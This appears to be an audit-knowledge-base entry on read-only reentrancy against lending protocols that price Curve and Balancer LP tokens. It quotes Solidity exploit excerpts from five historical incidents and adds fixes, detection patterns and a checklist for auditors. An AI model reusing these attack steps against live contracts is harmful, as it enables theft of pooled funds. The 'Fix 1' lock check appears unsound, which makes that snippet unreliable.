---
# Core Classification
protocol: "generic"
chain: "ethereum, arbitrum, polygon"
category: "reentrancy"
vulnerability_type: "read_only_reentrancy"

# Attack Vector Details
attack_type: "economic_exploit"
affected_component: "oracle_price_feed, collateral_valuation"

# Technical Primitives
primitives:
  - "read_only_reentrancy"
  - "curve_pool"
  - "balancer_pool"
  - "virtual_price"
  - "stale_oracle"
  - "LP_token_price"
  - "callback"
  - "remove_liquidity"
  - "exitPool"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.6
financial_impact: "critical"

# Context Tags
tags:
  - "defi"
  - "lending"
  - "reentrancy"
  - "oracle"
  - "curve"
  - "balancer"
  - "LP_token"
  - "liquidation"
  - "read_only"
  - "callback"

# Version Info
language: "solidity"
version: ">=0.8.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [DFO-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-02/dForce_exp.sol` |
| [SENT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-04/Sentiment_exp.sol` |
| [CONIC-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-07/Conic_exp.sol` |
| [STRD-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-06/Sturdy_exp.sol` |
| [MKT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/Market_exp.sol` |

---

# Read-Only Reentrancy Attack Patterns

## Overview

Read-only reentrancy is a class of vulnerability where an attacker reads stale on-chain state (e.g., Curve `get_virtual_price()` or Balancer LP token price) during a callback triggered by `remove_liquidity()` or `exitPool()`. Unlike traditional reentrancy that modifies state, read-only reentrancy exploits the fact that external protocols read price data from a pool whose internal balances haven't been updated yet. The attacker uses this temporarily inflated price to borrow, liquidate, or manipulate collateral valuations in lending protocols that rely on these LP token oracles. Between 2022-2023, this pattern caused **$8.9M+** in losses across 5+ protocols.

---

## 1. Curve Pool Read-Only Reentrancy

### Root Cause

Curve's `remove_liquidity()` function sends native ETH to the caller via `raw_call()` **before** updating the pool's internal balances. During the ETH transfer, the recipient's `fallback()` or `receive()` function is triggered. At this point, Curve's `get_virtual_price()` returns a stale value because the pool's token balances have been reduced (ETH sent out) but the LP token supply hasn't been burned yet. Any protocol reading this LP price during the callback sees an **inflated** value, enabling the attacker to borrow against overvalued collateral or perform liquidations at favorable rates.

### Attack Scenario

1. Flash loan massive amounts of ETH/WETH and other assets
2. Add liquidity to Curve pool (e.g., stETH/ETH) to obtain LP tokens
3. Call `remove_liquidity()` — Curve sends ETH before updating internal state
4. During `receive()` callback: Curve LP price is temporarily inflated
5. Exploit inflated price: borrow from lending protocol, liquidate positions, or mark pools as depegged
6. After callback completes, LP price returns to normal
7. Repay flash loan, keep profits

### Vulnerable Pattern Examples

**Example 1: dForce — Curve Stale LP Price During Liquidation ($3.65M, February 2023)** [Approx Vulnerability: CRITICAL] `@audit` [DFO-POC]

```solidity
// ❌ VULNERABLE: dForce reads Curve LP token price via oracle during reentrancy
// Curve's remove_liquidity sends ETH before updating internal balances

// Trigger: call remove_liquidity → ETH sent → receive() callback
curvePool.remove_liquidity(burnAmount, [uint256(0), uint256(0)]);

// Attacker's callback during Curve remove_liquidity
fallback() external payable {
    if (nonce == 0 && msg.sender == address(curvePool)) {
        nonce++;
        // @audit Price is INFLATED — Curve hasn't updated balances yet
        // get_virtual_price() returns stale (higher) value
        emit log_named_decimal_uint(
            "In reentrancy, price of VWSTETHCRVGAUGE",
            PriceOracle.getUnderlyingPrice(address(VWSTETHCRVGAUGE)),
            VWSTETHCRVGAUGE.decimals()
        );

        // @audit Liquidate borrower positions at INFLATED collateral price
        uint256 borrowAmount = dForceContract.borrowBalanceStored(address(borrower));
        dForceContract.liquidateBorrow(
            address(borrower), 560_525_526_525_080_924_601_515, address(VWSTETHCRVGAUGE)
        );

        // Liquidate another victim at inflated price
        dForceContract.liquidateBorrow(
            victimAddress2, 300_037_034_111_437_845_493_368, address(VWSTETHCRVGAUGE)
        );

        // Redeem seized collateral at inflated value
        VWSTETHCRVGAUGE.redeem(address(this), VWSTETHCRVGAUGE.balanceOf(address(this)));
    }
}
```

**Example 2: Conic Finance — Triple Curve Reentrancy + Pool Depegging ($3.25M, July 2023)** [Approx Vulnerability: CRITICAL] `@audit` [CONIC-POC]

```solidity
// ❌ VULNERABLE: Conic's handleDepeggedCurvePool uses stale LP prices
// Three-stage reentrancy: each Curve pool's remove_liquidity sends ETH

receive() external payable {
    if (msg.sender != address(WETH)) {
        if (nonce == 1) {
            // @audit steCRV price is INFLATED during reentrancy
            emit log_named_decimal_uint("In Read-Only-Reentrancy steCRV Price",
                Oracle.getUSDPrice(address(steCRV)), steCRV.decimals());
            // @audit Mark healthy pool as "depegged" using inflated price
            ConicEthPool.handleDepeggedCurvePool(address(LidoCurvePool));
        } else if (nonce == 2) {
            // cbETH_ETH_LP price also INFLATED
            ConicEthPool.handleDepeggedCurvePool(address(cbETH_ETH_Pool));
        } else if (nonce == 3) {
            // @audit All Curve pools marked depegged → withdraw at manipulated rates
            ConicEthPool.withdraw(6292 ether, 0);
            nonce++;
        }
    }
}

// Trigger reentrancy for each Curve pool
function reenter_1() internal {
    LidoCurvePool.add_liquidity{value: 20_000 ether}(amount, 0);
    nonce++;
    LidoCurvePool.remove_liquidity(steCRV.balanceOf(address(this)), amount);
    // → ETH sent → receive() → reentrancy with stale LP price
}
```

**Example 3: Market.xyz — Beefy Vault + Curve Read-Only Reentrancy ($220K, October 2022)** [Approx Vulnerability: HIGH] `@audit` [MKT-POC]

```solidity
// ❌ VULNERABLE: Market.xyz (Compound fork) uses Beefy Vault backed by Curve LP
// Curve remove_liquidity → stale virtual_price → inflated collateral → borrow MAI

// Step 1: Add massive liquidity to Curve pool
vyperContract.add_liquidity(
    [uint256(19_664_260 ether), uint256(49_999_999 ether)], 0
);

// Step 2: Small deposit as collateral via Beefy → Market.xyz
beefyVault.deposit(90_000 ether);
CErc20_mmooCurvestMATIC_MATIC_4.mint(beefyVault.balanceOf(address(this)));

// Step 3: Remove majority of liquidity — triggers callback
vyperContract.remove_liquidity(
    stMATIC_f.balanceOf(address(this)),
    [uint256(0), uint256(0)], true
);

// @audit During receive() callback: Curve virtual_price is stale/inflated
// Market.xyz reads inflated collateral value
receive() external payable {
    CErc20Delegate_mMAI_4.borrow(250_000 ether);  // Borrow 250K MAI
    // Collateral appears MORE valuable due to inflated Curve virtual_price
}
```

---

## 2. Balancer Pool Read-Only Reentrancy

### Root Cause

Balancer's `exitPool()` function sends native ETH to the caller before updating the pool's internal share accounting. During the ETH transfer callback, the attacker reads the Balancer LP token price from an external oracle (like Sentiment's `WeightedBalancerLPOracle` or Sturdy's asset oracle), which queries Balancer pool state that hasn't been updated yet. The LP token appears more valuable, enabling overborrowing or unauthorized collateral release.

### Vulnerable Pattern Examples

**Example 4: Sentiment — Balancer LP Oracle Inflation + Overborrow ($1M, April 2023)** [Approx Vulnerability: CRITICAL] `@audit` [SENT-POC]

```solidity
// ❌ VULNERABLE: Sentiment uses WeightedBalancerLPOracle.getPrice()
// which reads from Balancer pool state — stale during exitPool callback

// Step 1: Join Balancer weighted pool (WBTC/WETH/USDC) with massive amounts
Balancer.joinPool{value: 0.1 ether}(PoolId, address(this), address(this), joinPoolRequest);

// Step 2: Exit pool triggers reentrancy when ETH is sent
Balancer.exitPool(PoolId, address(this), payable(address(this)), exitPoolRequest);

// @audit REENTRANCY: fallback called during exitPool before balance update
fallback() external payable {
    if (nonce == 2) {
        // @audit LP price is INFLATED here — pool state not yet updated
        console.log("In Read-Only-Reentrancy Collateral Price",
            WeightedBalancerLPOracle.getPrice(address(balancerToken)));

        // @audit Borrow against overpriced collateral
        AccountManager.borrow(account, address(USDC), 461_000 * 1e6);
        AccountManager.borrow(account, address(USDT), 361_000 * 1e6);
        AccountManager.borrow(account, address(WETH), 81 * 1e18);
        AccountManager.borrow(account, address(FRAX), 125_000 * 1e18);

        // Route funds through Aave to extract to attacker
        AccountManager.exec(account, address(aaveV3), 0, supplyData);
        AccountManager.exec(account, address(aaveV3), 0, withdrawData);
    }
    nonce++;
}
```

**Example 5: Sturdy Finance — Balancer LP Inflation + Collateral Release ($800K, June 2023)** [Approx Vulnerability: CRITICAL] `@audit` [STRD-POC]

```solidity
// ❌ VULNERABLE: Sturdy reads B-stETH-STABLE price from oracle during exitPool callback
// Inflated price allows disabling steCRV as collateral (freed without repaying debt)

// Balancer exitPool sends ETH → receive() callback
receive() external payable {
    nonce++;
    if (nonce == 1) {
        // @audit B-stETH-STABLE price is ~3x INFLATED during reentrancy
        emit log_named_decimal_uint("In Read-Only-Reentrancy Collateral Price",
            SturdyOracle.getAssetPrice(cB_stETH_STABLE), B_STETH_STABLE.decimals());

        // @audit With inflated B-stETH-STABLE price, protocol thinks
        // 233 B-stETH-STABLE alone covers the 513 WETH debt
        lendingPool.setUserUseReserveAsCollateral(address(csteCRV), false);
        // NOW steCRV is freed — can be withdrawn without repaying debt!
    }
}

// After reentrancy: B-stETH-STABLE returns to normal price
// Attacker withdraws the freed steCRV collateral
ConvexCurveLPVault2.withdrawCollateral(address(steCRV), 1000 * 1e18, 10, address(this));

// Self-liquidate to reclaim B-stETH-STABLE
lendingPool.liquidationCall(
    address(B_STETH_STABLE), address(WETH), address(this), totalDebt, false
);
```

---

## Impact Analysis

### Technical Impact
- Stale oracle prices enable overborrowing against inflated LP collateral
- Liquidation at favorable rates during reentrancy window
- Collateral release/unbacking during temporary price inflation
- Pool depeg markers triggered on healthy pools (Conic Finance)
- All protocols relying on real-time Curve/Balancer LP prices are potentially affected

### Business Impact
- **Total losses 2022-2023:** $8.9M+ across 5 protocols
  - dForce $3.65M, Conic Finance $3.25M, Sentiment $1M, Sturdy Finance $800K, Market.xyz $220K
- Affects any lending protocol that accepts Curve/Balancer LP tokens as collateral
- Read-only reentrancy is harder to detect than state-modifying reentrancy
- Traditional reentrancy guards (`nonReentrant`) do NOT protect against this

### Affected Scenarios
- Lending protocols using Curve LP token price oracle (`get_virtual_price()`)
- Lending protocols using Balancer LP token oracle (pool invariant-based pricing)
- Liquidation engines that read LP prices during collateral seizure
- Pool health monitors that read LP prices to determine pool solvency

---

## Secure Implementation

**Fix 1: Reentrancy Guard on Oracle Reads**
```solidity
// ✅ SECURE: Check if Curve/Balancer pool is currently mid-transaction
// Curve pools expose a reentrancy lock that can be checked

function getPrice(address lpToken) external view returns (uint256) {
    // Check Curve pool reentrancy lock
    ICurvePool pool = ICurvePool(lpToken);
    
    // Curve v2 pools expose `is_killed()` or lock variable
    // Use raw staticcall to check the lock storage slot
    (bool success, ) = address(pool).staticcall(
        abi.encodeWithSignature("withdraw_admin_fees()")
    );
    require(success, "Pool is in reentrancy — price stale");
    
    return pool.get_virtual_price();
}
```

**Fix 2: TWAP-Based LP Token Pricing**
```solidity
// ✅ SECURE: Use time-weighted average pricing for LP tokens
// Cannot be manipulated within a single transaction

contract SecureLPOracle {
    struct Observation {
        uint256 timestamp;
        uint256 cumulativePrice;
    }
    
    mapping(address => Observation[]) public observations;
    uint256 constant TWAP_PERIOD = 30 minutes;
    
    function getLPPrice(address lpToken) external view returns (uint256) {
        Observation[] storage obs = observations[lpToken];
        require(obs.length >= 2, "Insufficient observations");
        
        Observation storage oldest = obs[obs.length - 2];
        Observation storage newest = obs[obs.length - 1];
        
        require(
            newest.timestamp - oldest.timestamp >= TWAP_PERIOD,
            "TWAP period not met"
        );
        
        return (newest.cumulativePrice - oldest.cumulativePrice) /
               (newest.timestamp - oldest.timestamp);
    }
}
```

**Fix 3: Chainlink-Based LP Token Price Feed**
```solidity
// ✅ SECURE: Derive LP token price from Chainlink feeds for underlying assets
// Immune to single-block LP price manipulation

function getLPTokenPrice(address pool) external view returns (uint256) {
    uint256 totalSupply = IERC20(pool).totalSupply();
    if (totalSupply == 0) return 0;
    
    uint256 totalValue = 0;
    for (uint i = 0; i < numTokens; i++) {
        uint256 balance = ICurvePool(pool).balances(i);
        uint256 tokenPrice = chainlinkOracle.getPrice(tokens[i]);
        totalValue += balance * tokenPrice / (10 ** decimals[i]);
    }
    
    // Use min of (oracle-derived price, virtual_price) as conservative estimate
    uint256 oraclePrice = totalValue * 1e18 / totalSupply;
    uint256 virtualPrice = ICurvePool(pool).get_virtual_price();
    return oraclePrice < virtualPrice ? oraclePrice : virtualPrice;
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- Curve `get_virtual_price()` used in price oracle without reentrancy check
- Balancer pool token pricing via pool.getRate() or invariant calculation
- `remove_liquidity()` or `exitPool()` followed by oracle read in same context
- `receive()` / `fallback()` functions that interact with lending protocols
- LP token collateral valuation without time-delay or TWAP protection
- Protocols accepting Curve/Balancer LP as collateral without reentrancy guards
- liquidateBorrow(), borrow(), or setUserUseReserveAsCollateral during callbacks
```

### Audit Checklist
- [ ] Does the protocol accept Curve or Balancer LP tokens as collateral?
- [ ] Does the LP token oracle read pool state that can be stale during callbacks?
- [ ] Is there a reentrancy guard on oracle price reads?
- [ ] Can `remove_liquidity()` or `exitPool()` trigger actions in the lending protocol?
- [ ] Does the oracle use TWAP or point-in-time pricing?
- [ ] Is `get_virtual_price()` called within a potential callback context?
- [ ] Are liquidation functions callable during external callbacks?
- [ ] Does `setUserUseReserveAsCollateral()` check price freshness?

---

## Real-World Examples

### Known Exploits
- **dForce** — Curve stale LP price → liquidation at wrong price, Arbitrum — February 2023 — $3.65M
  - Root cause: `remove_liquidity()` ETH callback → stale `get_virtual_price()` → profitable liquidation
- **Conic Finance** — Triple Curve reentrancy → pool depeg abuse, Ethereum — July 2023 — $3.25M
  - Root cause: Three successive `remove_liquidity()` callbacks → `handleDepeggedCurvePool()` abuse
- **Sentiment** — Balancer exitPool → inflated LP oracle → overborrow, Arbitrum — April 2023 — $1M
  - Root cause: `WeightedBalancerLPOracle.getPrice()` stale during `exitPool()` callback
- **Sturdy Finance** — Balancer exitPool → inflated collateral → free steCRV, Ethereum — June 2023 — $800K
  - Root cause: Inflated B-stETH-STABLE price allowed disabling steCRV as collateral
- **Market.xyz** — Curve + Beefy vault → stale virtual_price → MAI borrow, Polygon — October 2022 — $220K
  - Root cause: Beefy vault LP price derived from Curve `get_virtual_price()` during callback

---

## Prevention Guidelines

### Development Best Practices
1. Never use real-time `get_virtual_price()` or Balancer pool rates for collateral valuation
2. Implement reentrancy detection on oracle reads (check pool lock state)
3. Use TWAP-based LP token pricing to prevent single-block manipulation
4. Derive LP prices from Chainlink feeds of underlying assets as fallback
5. Block lending operations (borrow, liquidate, collateral management) during external callbacks
6. Use `nonReentrant` on all lending pool entry points, not just state-modifying ones

### Testing Requirements
- Unit tests for: LP token price behavior during `remove_liquidity()` callbacks
- Integration tests for: borrow/liquidate during reentrancy window, collateral release during callback
- Fuzzing targets: Oracle price readings during pool operations, callback interactions with lending protocols
- Reentrancy tests: Verify that oracle reads within `receive()` context return safe values

---

## Keywords for Search

> `read-only reentrancy`, `view reentrancy`, `Curve reentrancy`, `Balancer reentrancy`, `get_virtual_price`, `virtual_price`, `stale oracle`, `LP token price`, `remove_liquidity callback`, `exitPool callback`, `oracle manipulation`, `liquidation reentrancy`, `collateral valuation`, `receive callback`, `fallback reentrancy`, `pool depeg`, `Curve LP oracle`, `Balancer LP oracle`, `handleDepeggedCurvePool`, `weighted oracle`, `cross-protocol reentrancy`, `view function reentrancy`

---

## Related Vulnerabilities

- `DB/general/reentrancy/defihacklabs-reentrancy-patterns.md` — Traditional reentrancy patterns
- `DB/oracle/price-manipulation/defihacklabs-price-manipulation-patterns.md` — Flash loan oracle manipulation
- `DB/general/vault-inflation-attack/defihacklabs-vault-inflation-patterns.md` — Vault exchange rate manipulation
- `DB/unique/defihacklabs/compiler-level-vulnerabilities.md` — Compiler-level reentrancy (Vyper)
